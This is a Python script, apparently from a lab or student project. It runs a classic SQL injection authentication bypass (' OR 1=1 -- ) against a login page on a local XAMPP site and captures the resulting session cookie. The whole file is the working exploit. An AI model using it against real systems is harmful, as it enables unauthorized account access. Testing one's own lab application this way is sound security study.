import requests

#-------- can delete these ----------------------
# Target URL (change to wherever the site is running on your XAMPP)
target_url = "http://localhost/CyberProject/login.php"

# The payload we discovered that bypasses authentication.
# Note: SQLite requires a trailing space after the -- comment token.
payload_username = "' OR 1=1 -- "
payload_password = "anything_works"
#-----------------------------------------------

def sql_login_bypass(target_url="http://localhost/CyberProject/login.php", payload_username="' OR 1=1 -- ", payload_password="anything_works"):        
    # Form data (the field names must match the name= attributes in the HTML).
    data = {
        "username": payload_username,
        "password": payload_password,
        "login_submit": "" # Send the submit button so PHP recognises the request.
    }

    print(f"[*] Attempting SQL Injection on {target_url}...")

    try:
        # Don't follow redirects automatically so we can see the 302.
        response = requests.post(target_url, data=data, allow_redirects=False)

        # On successful login, login.php sends header("Location: home.php") -> 302.
        if response.status_code == 302 and "home.php" in response.headers.get("Location", ""):
            session_id = response.cookies.get("PHPSESSID")
            print("[+] SUCCESS: SQL Injection Bypass Worked!")
            print(f"[+] Logged in as the first user in the database.")
            return session_id
        elif "Invalid username or password" in response.text:
            print("[-] FAILED: Injection was blocked or incorrect.")
        else:
            print("[?] UNKNOWN: Received unexpected response. Check manually.")

    except Exception as e:
        print(f"[!] Error: {e}")